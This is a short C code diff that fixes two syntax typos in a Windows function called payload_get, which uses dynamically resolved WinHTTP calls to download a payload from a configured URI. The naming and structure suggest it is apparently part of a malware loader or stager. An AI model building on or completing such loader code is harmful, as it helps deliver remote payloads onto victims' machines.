@@ -36,7 +36,7 @@ LPVOID payload_get(PDWORD PayloadSize) {
     if (!hConnect) goto CLEANUP;
 
 
-    httpFlags = g_ldr->config->http.isSecure ? WINHTTP_FLAG_SECURE : 0
+    httpFlags = g_ldr->config->http.isSecure ? WINHTTP_FLAG_SECURE : 0;
 
     hRequest = g_ldr->apis->WinHttpOpenRequest(hConnect, L"GET", g_ldr->config->http.uri, NULL,
         WINHTTP_NO_REFERER,
@@ -56,7 +56,7 @@ LPVOID payload_get(PDWORD PayloadSize) {
         WINHTTP_NO_ADDITIONAL_HEADERS, 0,
         WINHTTP_NO_REQUEST_DATA, 0,
         0, 0);
-    if (!bResults) goto CLEANUP;s
+    if (!bResults) goto CLEANUP;
 
     bResults = g_ldr->apis->WinHttpReceiveResponse(hRequest, NULL);
     if (!bResults) goto CLEANUP;
